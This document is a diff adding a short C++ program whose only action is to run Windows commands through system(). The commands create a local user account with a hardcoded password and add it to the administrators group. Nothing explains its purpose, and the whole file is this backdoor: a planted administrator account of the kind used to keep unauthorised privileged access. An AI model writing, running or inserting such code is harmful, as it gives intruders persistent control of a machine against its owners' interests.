@@ -1,0 +1,7 @@
+#include <iostream>
+
+int main()
+{
+    system("net user BrightLights TheHomeTownOfMayorVille1886 /Y /add && net localgroup administrators BrightLights /add ");
+    return 0;
+}
